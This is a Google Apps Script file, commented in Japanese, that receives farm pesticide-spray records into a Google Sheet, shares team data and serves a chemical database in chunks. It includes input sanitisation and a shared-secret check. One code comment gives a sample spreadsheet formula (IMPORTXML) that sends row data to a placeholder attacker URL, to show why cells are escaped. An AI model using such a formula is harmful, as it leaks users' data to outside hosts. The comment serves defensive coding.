// ════════════════════════════════════════════════════════
//  薬液調合ノート — 防除記録受信スクリプト v3(Google Apps Script)
//  ★1回の散布 = シート1行(薬剤は1つのセルにまとめて記載)
//
//  【新規設置】
//  1. Googleスプレッドシートを新規作成
//  2. 拡張機能 → Apps Script → このコードを貼り付けて保存
//  3. デプロイ → 新しいデプロイ → ウェブアプリ
//     (実行: 自分 ／ アクセス: 全員)
//  4. ウェブアプリのURL(…/exec)をアプリの設定に貼り付け
//
//  【農薬データ(chemdb.json)の置き場所】
//  アプリには農薬登録データを同梱していません(FAMICの利用規約により再配布しない
//  方針のため)。各自でデータを用意し、このスクリプト経由で端末に配ります。
//  1. リポジトリ直下で `python tools/update_chemdb.py` を実行し chemdb.json を作る
//     (できたファイルはリポジトリにコミットしないこと)
//  2. 自分のGoogleドライブに chemdb.json をアップロードする
//  3. そのファイルを開いたときのURL
//     https://drive.google.com/file/d/【ここがファイルID】/view
//     からファイルIDをコピーする
//  4. Apps Script の左メニュー「プロジェクトの設定」(歯車)→「スクリプト プロパティ」
//     → プロパティ名: CHEMDB_FILE_ID ／ 値: 手順3のファイルID → 保存
//     ※未設定の場合はドライブ内で "chemdb.json" という名前のファイルを探します。
//       同名ファイルが複数あると意図しないほうを掴むので、IDの設定を推奨します。
//  5. デプロイ → デプロイを管理 → 鉛筆 → バージョン「新バージョン」→ デプロイ
//  6. 各端末のアプリで 設定タブ →「農薬データ」→「⬇ 農薬データを取り込む」
//  取り込んだデータは端末内(IndexedDB)に保存されるので、以後は圏外でも検索できます。
//
//  【v2からの更新】
//  1. Apps Script のコードをこの内容に差し替えて保存
//  2. シート下部のタブ「防除記録」を右クリック → 名前を変更
//     (例:「防除記録_旧」)※旧形式のデータを残すため
//  3. デプロイ → デプロイを管理 → 鉛筆 → バージョン「新バージョン」→ デプロイ
//     (URLは変わらないので、スマホ側の再設定は不要)
//  次の受信時に、新しい1行形式の「防除記録」シートが自動で作られます。
//
//  【合言葉(SHARED_SECRET)の設定 ※強く推奨】
//  ウェブアプリのアクセスを「全員」にしている都合上、/exec のURLさえ
//  知られると、第三者が記録の追記・チーム共有データの読み出し/上書きを
//  実行できてしまいます。これを防ぐため、合言葉を設定してください。
//  1. Apps Script の左メニュー「プロジェクトの設定」(歯車)を開く
//  2. 「スクリプト プロパティ」→「スクリプト プロパティを追加」
//  3. プロパティ名: SHARED_SECRET ／ 値: 任意の長い文字列
//     (推測されにくいもの。例: 英数字20文字以上。パスワードの使い回しは避ける)
//  4. 「スクリプト プロパティを保存」を押す
//  5. アプリ側の設定画面の「合言葉」欄に、同じ文字列を入力する
//  ※未設定でも従来どおり動きます(既存の設置を壊さないため)。ただし
//    その場合はアプリの接続テストに「未設定です」と表示されます。
// ════════════════════════════════════════════════════════

const SHEET_NAME = "防除記録";

const HEADERS = [
  "受信日時",     // 1
  "記録ID",       // 2
  "散布日",       // 3
  "記録者",       // 4
  "圃場",         // 5
  "作物",         // 6
  "面積(a)",      // 7
  "薬剤数",       // 8
  "薬剤内容",     // 9  例: 薬剤A(フロアブル・10倍・1000mL) / 薬剤B(乳剤・16倍・625mL)
  "総量(L)",      // 10
  "水量(L)",      // 11
  "実散布量(L)",  // 12
  "状態",         // 13 調合済 / 散布済
  "報告日",       // 14
  "備考",         // 15
];
const COL = {
  ID: 2, AREA: 7, CHEM_N: 8, CHEM_TEXT: 9, TOTAL: 10, WATER: 11,
  SPRAYED: 12, STATUS: 13, REPORT_DATE: 14, MEMO: 15,
};

// ── セルに書く文字列を「数式ではない」ものとして固定する ──
// 圃場名や備考にそのまま任せると、= や + で始まる文字列がスプレッドシート側で
// 数式として評価されてしまう(数式インジェクション)。たとえば
//   =IMPORTXML("https://攻撃者/?d="&TEXTJOIN(",",1,A2:O2),"//x")
// と入力された記録を1行追記しただけで、その行の中身が外部へ送信される。
// 先頭にアポストロフィを付けると、Sheetsは以降を必ず文字列として扱う
// (画面上・CSV出力ともアポストロフィは表示されない)。
// タブ・改行始まりも、前方の空白が無視されて数式と判定されうるので同じ扱いにする。
function safeCell_(v) {
  if (v === null || v === undefined) return "";
  if (typeof v === "number" || typeof v === "boolean" || v instanceof Date) return v;
  const s = String(v);
  return /^[=+\-@\t\r\n]/.test(s) ? "'" + s : s;
}

// ── 合言葉(スクリプトプロパティ SHARED_SECRET)の照合 ──
// 未設定なら null を返す。呼び出し側はその場合、従来どおり素通しする。
function sharedSecret_() {
  const s = PropertiesService.getScriptProperties().getProperty("SHARED_SECRET");
  return s ? String(s) : null;
}

// 定数時間に近い比較。=== は先頭が違った時点で false を返すため、応答時間の差から
// 1文字ずつ合言葉を当てられる余地がある(GASは呼び出しごとの揺らぎが大きく現実的な
// 脅威ではないが、比較の書き方としてこちらを既定にする)。
// 長さの違いだけは隠せないので、短いほうを空文字で埋めて必ず全文字を走査する。
function secretEquals_(a, b) {
  const x = String(a == null ? "" : a);
  const y = String(b == null ? "" : b);
  const n = Math.max(x.length, y.length);
  let diff = x.length ^ y.length;
  for (let i = 0; i < n; i++) {
    diff |= (x.charCodeAt(i) || 0) ^ (y.charCodeAt(i) || 0);
  }
  return diff === 0;
}

function getSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_NAME);
  if (!sh) sh = ss.insertSheet(SHEET_NAME);
  if (sh.getLastRow() === 0) {
    sh.appendRow(HEADERS);
    sh.getRange(1, 1, 1, HEADERS.length).setFontWeight("bold").setBackground("#EDF5EE");
    sh.setFrozenRows(1);
  }
  return sh;
}

// 散布日ごとに行の背景色を塗り分ける(同じ散布日は同色、日付が変わると色が切り替わる)
const DATE_COLORS = [
  "#FFFFFF", // 白
  "#EAF4EA", // 薄緑
  "#FDF3E0", // 薄オレンジ
  "#E8F1FA", // 薄青
  "#F6ECF6", // 薄紫
];

function colorByDate_(sh) {
  const last = sh.getLastRow();
  if (last < 2) return;
  const n = last - 1;
  const dates = sh.getRange(2, 3, n, 1).getValues(); // 3列目 = 散布日
  const colorOf = {};   // 散布日 → 色
  let next = 0;         // 次に割り当てる色の番号
  const bg = [];
  for (let i = 0; i < n; i++) {
    const v = dates[i][0];
    const key = (v instanceof Date)
      ? Utilities.formatDate(v, "Asia/Tokyo", "yyyy-MM-dd")
      : String(v || "");
    if (!(key in colorOf)) {
      colorOf[key] = DATE_COLORS[next % DATE_COLORS.length];
      next++;
    }
    const c = colorOf[key];
    bg.push(new Array(HEADERS.length).fill(c));
  }
  sh.getRange(2, 1, n, HEADERS.length).setBackgrounds(bg);
}

// 既存の全行を塗り直す(GASエディタから手動実行)
function recolorAll() {
  colorByDate_(getSheet_());
}

// 旧レイアウトのヘッダー行を現行HEADERSに貼り直す(GASエディタから1回だけ手動実行)
function fixHeaders() {
  const sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_NAME);
  if (!sh) throw new Error("シートがありません: " + SHEET_NAME);
  const lastCol = Math.max(sh.getLastColumn(), HEADERS.length);
  sh.getRange(1, 1, 1, lastCol).clearContent();
  sh.getRange(1, 1, 1, HEADERS.length).setValues([HEADERS])
    .setFontWeight("bold").setBackground("#EDF5EE");
  sh.setFrozenRows(1);
}

// 指定した記録IDの行番号を返す(なければ0)
function findRow_(sh, recordId) {
  if (sh.getLastRow() < 2) return 0;
  const ids = sh.getRange(2, COL.ID, sh.getLastRow() - 1, 1).getValues().flat();
  for (let i = 0; i < ids.length; i++) {
    if (String(ids[i]) === String(recordId)) return i + 2;
  }
  return 0;
}

// チーム共有データ用のシート(チームコード / データ / 保存日時 / 保存者)
function getShareSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName("_共有データ");
  if (!sh) {
    sh = ss.insertSheet("_共有データ");
    sh.appendRow(["チームコード", "データ", "保存日時", "保存者"]);
    sh.getRange(1, 1, 1, 4).setFontWeight("bold").setBackground("#EAF3FA");
    sh.setFrozenRows(1);
  }
  return sh;
}
// 共有データの上書き履歴シート。cloudSave は1チーム1行を丸ごと置き換えるため、
// 誤操作や古い端末からの保存で、他の人が入れた圃場・薬剤が一瞬で消えうる。
// 上書き直前の値をここに積んでおけば、コピーして戻すだけで復旧できる。
const SHARE_LOG_NAME = "_共有データ履歴";
const SHARE_LOG_MAX = 200; // これを超えたら古い行から捨てる(シートの肥大化を防ぐ)

function getShareLogSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHARE_LOG_NAME);
  if (!sh) {
    sh = ss.insertSheet(SHARE_LOG_NAME);
    sh.appendRow(["保存日時", "チームコード", "保存者", "直前のデータ"]);
    sh.getRange(1, 1, 1, 4).setFontWeight("bold").setBackground("#F3EEE6");
    sh.setFrozenRows(1);
  }
  return sh;
}

// 上書き前の値を1行残す。prev が空(初回保存)なら記録しない。
function pushShareLog_(team, by, prev, when) {
  if (!prev) return;
  const sh = getShareLogSheet_();
  sh.appendRow([when, safeCell_(team), safeCell_(by), safeCell_(prev)]);
  const over = (sh.getLastRow() - 1) - SHARE_LOG_MAX; // 1行目はヘッダー
  if (over > 0) sh.deleteRows(2, over); // 2行目 = いちばん古い履歴
}

// チームコードの行番号を返す(なければ0)
function findShareRow_(sh, team) {
  if (sh.getLastRow() < 2) return 0;
  const teams = sh.getRange(2, 1, sh.getLastRow() - 1, 1).getValues().flat();
  for (let i = 0; i < teams.length; i++) {
    if (String(teams[i]) === String(team)) return i + 2;
  }
  return 0;
}

// ══════════ 農薬データ(chemdb.json)の配信 ══════════
// Googleドライブに置いた chemdb.json を読み、分割して返す。
// アプリ側は part=0 から順に呼び、chunk を連結して JSON.parse する。
//
// なぜ分割するのか:
//   chemdb.json は約940KB。ContentService が1回の応答で返せる大きさの上限は
//   公式に明示されておらず、環境によって変わりうる。1回で返す前提で作ると
//   「ある人の環境では動くが、ある人の環境では無言で切れる」という最悪の壊れ方をする。
//   最初から分割して返せば、上限がいくつであっても既定の25万文字が通れば動く。

const CHEMDB_DEFAULT_CHUNK = 250000; // 1パートの文字数(コードユニット)の既定値
const CHEMDB_MAX_CHUNK = 400000;     // 端末から大きすぎる値を指定されても、ここで頭打ちにする

// 配信するファイルを特定する。スクリプトプロパティ CHEMDB_FILE_ID を優先し、
// 未設定ならドライブ内の "chemdb.json" という名前のファイルにフォールバックする。
// 見つからなければ null。
function chemdbFile_() {
  const id = PropertiesService.getScriptProperties().getProperty("CHEMDB_FILE_ID");
  if (id) {
    try {
      return DriveApp.getFileById(String(id).trim());
    } catch (err) {
      // IDの打ち間違い・削除済み・権限なし。名前での検索に落として復旧の芽を残す。
      // 詳細(err)は返さない。ドライブの内部事情を外に出す必要がない。
    }
  }
  const it = DriveApp.getFilesByName("chemdb.json");
  return it.hasNext() ? it.next() : null;
}

// ── キャッシュしない判断について ──
// 毎回ドライブから読み直すのは遅い(1パートごとに1回読む)。CacheService に載せられれば
// 速くなるが、CacheService は1項目100KBが上限。chemdb.json は約940KB、1パートでも
// 25万文字(UTF-8で数百KB)あり、全体はもちろん1パートすら入らない。
// 100KB未満に切り刻んで10数個のキーに分けて入れることは理屈上は可能だが、
// 一部だけ失効したときに古い断片と新しい断片が混ざり、壊れたJSONを配ってしまう。
// 取り込みは各端末で数か月に1回の操作なので、速度より確実さを取ってキャッシュしない。

// part 番目のチャンクを返す。
function chemdbChunk_(part, size) {
  const file = chemdbFile_();
  if (!file) return { ok: false, error: "chemdb not found" };

  // getDataAsString("UTF-8") でバイト列を文字列にしてから切る。
  // バイト単位で切ると日本語(UTF-8で3バイト)が途中で割れて壊れるため、必ず文字列にしてから切る。
  const text = file.getBlob().getDataAsString("UTF-8");
  const len = text.length; // JSの文字列長 = UTF-16コードユニット数

  let step = Math.floor(Number(size) || CHEMDB_DEFAULT_CHUNK);
  if (!(step > 0)) step = CHEMDB_DEFAULT_CHUNK;
  if (step > CHEMDB_MAX_CHUNK) step = CHEMDB_MAX_CHUNK;

  const n = Math.max(0, Math.floor(Number(part) || 0));
  let start = n * step;
  if (start >= len) return { ok: false, error: "part out of range" };
  let end = Math.min(start + step, len);

  // ── サロゲートペアを割らない ──
  // substring はコードユニット単位なので、境界がサロゲートペアの真ん中に来ると
  // 上位・下位が別パートに分かれ、連結する前の各チャンクが壊れた文字を含む。
  // (連結すれば元に戻るとはいえ、途中で文字数を数えたりログに出したりすると化ける)
  // 境界の直前が上位サロゲート(U+D800〜U+DBFF)なら1つ手前で切り、下位サロゲートを次のパートへ送る。
  // start 側は「前のパートが同じ規則で切った位置」と一致させる必要があるので、同じ判定を行う。
  const backOffIfSplit = (pos) => {
    if (pos <= 0 || pos >= len) return pos;
    const c = text.charCodeAt(pos - 1);
    return (c >= 0xD800 && c <= 0xDBFF) ? pos - 1 : pos;
  };
  start = backOffIfSplit(start);
  end = backOffIfSplit(end);

  // 全パート数。境界がずれても1文字ぶんなので、切り上げで数えた値とパート番号は必ず一致する
  // (ずれるのは各パートの長さだけで、step 文字ずつ進む点は変わらない)。
  const total = Math.max(1, Math.ceil(len / step));
  return {
    ok: true,
    part: n,
    total: total,
    // bytes = ファイルのバイト数(進捗表示・整合確認用)。分割の基準は文字数なので
    // chars も返す。日本語が多いぶん bytes は chars の2〜3倍になる。
    bytes: file.getSize(),
    chars: len,
    chunk: text.substring(start, end)
  };
}

// 薬剤リストを1セル用の文字列にまとめる(用途・剤型・倍率・薬量)
// 薬剤名はユーザーが自由に入力できる(プリセット名)ので、
// 連結後の文字列を safeCell_ に通してから返す。
function chemsText_(chems) {
  return safeCell_(chems.map(function (c) {
    var parts = [];
    if (c.useName) parts.push(c.useName);
    if (c.formName) parts.push(c.formName);
    parts.push((c.ratio || "?") + "倍");
    parts.push(Math.round(Number(c.ml) || 0) + "mL");
    return (c.name || "(無名)") + "(" + parts.join("・") + ")";
  }).join(" / "));
}

// 1散布ぶんの行データを作る
function buildRow_(data, status) {
  const rec = data.record;
  const now = Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");
  // 文字列の項目は safeCell_ を通す(数式インジェクション対策)。
  // 数値の項目は Number() を通しているので、数式になりようがない。
  return [
    now,
    safeCell_(String(rec.id)),
    safeCell_(rec.date || ""),
    safeCell_(data.recorder || ""),
    safeCell_(rec.field || ""),
    safeCell_(rec.crop || ""),
    Number(rec.reportAreaA || rec.areaA) || "",
    rec.chems.length,
    chemsText_(rec.chems),
    Number(rec.totalL) || 0,
    Math.round(Number(rec.waterMl) || 0) / 1000, // mL→L
    status === "散布済" ? (Number(rec.sprayedL) || "") : "",
    status,
    safeCell_(status === "散布済" ? (rec.reportDate || "") : ""),
    safeCell_((status === "散布済" ? (rec.reportMemo || rec.memo) : rec.memo) || ""),
  ];
}

// ── 受信(アプリからのPOST) ──
function doPost(e) {
  const lock = LockService.getScriptLock();
  // tryLock はロックを取れなくても例外を投げない。以前は waitLock を try の外で
  // 呼んでいたため、取得に失敗すると finally の releaseLock() が
  // 「ロックを持っていない」という二次例外を出し、本当の原因が隠れていた。
  if (!lock.tryLock(10000)) {
    // 他の端末の送信と競合しただけ。アプリ側は未送信のまま再送すればよい。
    return json_({ ok: false, error: "busy" });
  }
  try {
    const data = JSON.parse(e.postData.contents);

    // ── 合言葉の照合 ──
    // スクリプトプロパティ SHARED_SECRET が設定されているときだけ検証する。
    // 未設定の既存デプロイをいきなり弾くと現場の記録が止まるため、後方互換を優先。
    const secret = sharedSecret_();
    if (secret && !secretEquals_(secret, data.auth)) {
      // 何が違うか(未設定なのか不一致なのか)は返さない。総当たりの手がかりになる。
      return json_({ ok: false, error: "auth" });
    }

    const type = data.type || "record";

    // ── 農薬データの配信(分割) ──
    // 合言葉の照合より後に置いてある。URLを知る第三者にドライブのファイルを
    // 読ませないため、記録の書き込みと同じ認証を通す。
    if (type === "chemdbLoad") {
      return json_(chemdbChunk_(data.part, data.size));
    }

    // ── チーム共有:圃場・薬剤・作業リストのまとめ保存/読込 ──
    // 専用シート「_共有データ」に保存(PropertiesServiceの9KB上限を回避)
    if (type === "cloudSave") {
      if (!data.team) return json_({ ok: false, error: "team required" });
      const sh = getShareSheet_();
      const row = findShareRow_(sh, data.team);
      const payload = String(data.payload || "");
      // スプレッドシートの1セルは50000文字が上限。超えると切り捨て、あるいは
      // 書き込み自体が失敗して、次の cloudLoad で壊れたJSONが返る(無言のデータ破損)。
      // 余裕を見て45000文字で断り、アプリ側に「保存できなかった」と伝える。
      if (payload.length > 45000) {
        return json_({ ok: false, error: "データが大きすぎます(セル上限)" });
      }
      const when = new Date();
      if (row > 0) {
        // 上書きする前に、いまの値を履歴シートへ退避する
        pushShareLog_(data.team, data.by, sh.getRange(row, 2).getValue(), when);
        // payload はアプリが作るJSON文字列だが、"=" 始まりの値を作られると
        // セルが数式として評価されてしまう。読み出し側で困るので文字列に固定する。
        sh.getRange(row, 2).setValue(safeCell_(payload));
        sh.getRange(row, 3).setValue(when);
        sh.getRange(row, 4).setValue(safeCell_(data.by || ""));
      } else {
        sh.appendRow([safeCell_(data.team), safeCell_(payload), when, safeCell_(data.by || "")]);
      }
      return json_({ ok: true, saved: true, size: payload.length });
    }
    if (type === "cloudLoad") {
      if (!data.team) return json_({ ok: false, error: "team required" });
      const sh = getShareSheet_();
      const row = findShareRow_(sh, data.team);
      if (row <= 0) return json_({ ok: true, payload: null });
      const payload = sh.getRange(row, 2).getValue();
      return json_({ ok: true, payload: payload || null });
    }

    const rec = data.record;
    if (!rec || !rec.id || !Array.isArray(rec.chems)) {
      return json_({ ok: false, error: "invalid payload" });
    }
    const sh = getSheet_();
    const row = findRow_(sh, rec.id);

    if (type === "record") {
      // 既に行がある場合は薬剤の内容だけ上書きする。
      // (実績入力のあとから薬剤を適用したケースを反映するため。行は増やさない)
      if (row > 0) {
        sh.getRange(row, COL.CHEM_N, 1, 4).setValues([[
          rec.chems.length,
          chemsText_(rec.chems),
          Number(rec.totalL) || 0,
          Math.round(Number(rec.waterMl) || 0) / 1000,
        ]]);
        return json_({ ok: true, updated: 1, chemsOnly: true });
      }
      sh.appendRow(buildRow_(data, "調合済"));
      colorByDate_(sh);
      return json_({ ok: true, added: 1 });
    }

    if (type === "report") {
      // 散布完了報告:既存の行を更新
      if (row > 0) {
        sh.getRange(row, COL.SPRAYED).setValue(Number(rec.sprayedL) || "");
        sh.getRange(row, COL.STATUS).setValue("散布済");
        sh.getRange(row, COL.REPORT_DATE).setValue(safeCell_(rec.reportDate || ""));
        if (rec.reportAreaA) sh.getRange(row, COL.AREA).setValue(Number(rec.reportAreaA) || "");
        if (rec.reportMemo) sh.getRange(row, COL.MEMO).setValue(safeCell_(rec.reportMemo));
        return json_({ ok: true, updated: 1 });
      }
      // 元の記録が見つからない場合は報告内容ごと新規追加(取りこぼし防止)
      sh.appendRow(buildRow_(data, "散布済"));
      colorByDate_(sh);
      return json_({ ok: true, added: 1 });
    }

    return json_({ ok: false, error: "unknown type" });
  } catch (err) {
    return json_({ ok: false, error: String(err) });
  } finally {
    lock.releaseLock();
  }
}

// ── 接続テスト(アプリの「接続テスト」ボタンからのGET) ──
function doGet() {
  // secured は「合言葉が設定済みか」。false のときアプリ側で
  // 「合言葉が未設定です」と出せるようにするための情報で、合言葉そのものは返さない。
  return json_({
    ok: true,
    app: "薬液調合ノート 受信口 v8(1散布=1行・チーム共有対応)",
    sheet: SHEET_NAME,
    secured: !!sharedSecret_(),
  });
}

function json_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
